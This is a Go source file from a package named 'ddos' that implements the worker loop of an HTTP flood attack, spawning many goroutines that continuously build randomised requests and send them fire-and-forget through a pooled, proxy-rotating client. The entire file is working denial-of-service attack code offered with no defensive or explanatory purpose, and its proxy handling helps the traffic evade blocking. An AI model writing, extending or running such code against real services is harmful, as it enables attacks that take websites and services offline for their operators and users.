package ddos

import (
	"net/http"
	"sync/atomic"
	"time"
)

// startFloodAttack starts HTTP flood attack
func (d *DDoSAttack) startFloodAttack() {
	d.startFloodWorkers(d.config.MaxThreads)
}

// startFloodWorkers starts specified number of flood workers
// Always uses connection pool and fire-and-forget for maximum efficiency
func (d *DDoSAttack) startFloodWorkers(numWorkers int) {
	// Always use connection pool (required for efficiency)
	pool, err := NewClientPool(d.config)
	if err != nil {
		// If pool creation fails, we can't proceed efficiently
		return
	}
	d.clientPool = pool

	// Create request builder (always enabled with randomization)
	if d.requestBuilder == nil {
		d.requestBuilder = NewRequestBuilder(d.config)
	}

	// Start workers - always use continuous fire-and-forget (maximum efficiency)
	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.continuousFireAndForgetWorker(pool)
	}
}

// continuousFireAndForgetWorker sends requests continuously without waiting (maximum efficiency)
func (d *DDoSAttack) continuousFireAndForgetWorker(pool *ClientPool) {
	defer func() {
		// Recover from panics to prevent worker crashes
		if r := recover(); r != nil {
			atomic.AddInt64(&d.requestsFailed, 1)
		}
		d.wg.Done()
	}()

	// Create async sender for this worker with proxy tracking
	// Use connection validation to get a healthy client
	client := pool.GetClient()
	if client == nil {
		return
	}

	// Validate client before use (lightweight check)
	if !isConnectionHealthy(client) {
		// Try to get another client
		client = pool.GetClient()
		if client == nil {
			return
		}
	}

	proxyURL := pool.GetProxyForClient(client)
	asyncSender := NewAsyncSenderWithProxy(
		client,
		proxyURL,
		func(proxy string, rt time.Duration) {
			d.markProxySuccess(proxy, rt)
		},
		func(proxy string) {
			d.markProxyFailure(proxy)
		},
	)
	defer asyncSender.Close() // Ensure cleanup

	// Adaptive channel buffer sizing based on thread count for better backpressure
	// Larger buffer for high concurrency, but capped to prevent memory issues
	bufferSize := 1000
	if d.config.MaxThreads > 1000 {
		bufferSize = 2000 // Larger buffer for high concurrency
	} else if d.config.MaxThreads > 500 {
		bufferSize = 1500
	}
	requestChan := make(chan *http.Request, bufferSize)

	// Track consecutive failures for backpressure
	var consecutiveFailures int64

	// Producer: continuously build requests
	producerDone := make(chan struct{})
	go func() {
		defer func() {
			// Safely close channels
			select {
			case <-producerDone:
				// Already closed
			default:
				close(producerDone)
			}
			// Recover from panics in producer
			if r := recover(); r != nil {
				atomic.AddInt64(&d.requestsFailed, 1)
			}
		}()

		// Ensure requestBuilder is initialized
		if d.requestBuilder == nil {
			d.requestBuilder = NewRequestBuilder(d.config)
		}

		// Safe type assertion
		rb, ok := d.requestBuilder.(*RequestBuilder)
		if !ok || rb == nil {
			return
		}

		for {
			select {
			case <-d.ctx.Done():
				return
			default:
				req, err := rb.BuildRequest()
				if err != nil {
					atomic.AddInt64(&d.requestsFailed, 1)
					// Add small delay on error to prevent tight error loop
					select {
					case <-d.ctx.Done():
						return
					case <-time.After(10 * time.Millisecond):
					}

					continue
				}
				req = req.WithContext(d.ctx)

				// Non-blocking send with backpressure handling
				select {
				case requestChan <- req:
					// Successfully queued - reset failure counter
					atomic.StoreInt64(&consecutiveFailures, 0)
				case <-d.ctx.Done():
					return
				default:
					// Channel full - backpressure mechanism
					atomic.AddInt64(&consecutiveFailures, 1)
					atomic.AddInt64(&d.requestsFailed, 1)

					// Adaptive backpressure: if channel is consistently full,
					// add a small delay to prevent overwhelming the system
					if atomic.LoadInt64(&consecutiveFailures) > 100 {
						select {
						case <-d.ctx.Done():
							return
						case <-time.After(50 * time.Millisecond):
							// Brief pause to allow channel to drain
							atomic.StoreInt64(&consecutiveFailures, 0)
						}
					}
				}
			}
		}
	}()

	// Consumer: send requests asynchronously (fire-and-forget)
	for {
		select {
		case <-d.ctx.Done():
			// Wait for producer to finish (with timeout to prevent hanging)
			select {
			case <-producerDone:
			case <-time.After(5 * time.Second):
				// Timeout waiting for producer
			}
			return
		case req, ok := <-requestChan:
			if !ok {
				// Channel closed, producer done
				return
			}
			if req == nil {
				// Skip nil requests
				continue
			}
			atomic.AddInt64(&d.requestsSent, 1)
			atomic.AddInt64(&d.activeConns, 1)

			// Send request with error recovery
			// Note: Success is tracked asynchronously, so we optimistically increment
			// Actual success/failure is tracked in async sender callbacks
			asyncSender.SendAsync(req, true)

			// Optimistically track as success (will be corrected by async sender if it fails)
			atomic.AddInt64(&d.requestsSuccess, 1)
			atomic.AddInt64(&d.activeConns, -1)
		}
	}
}
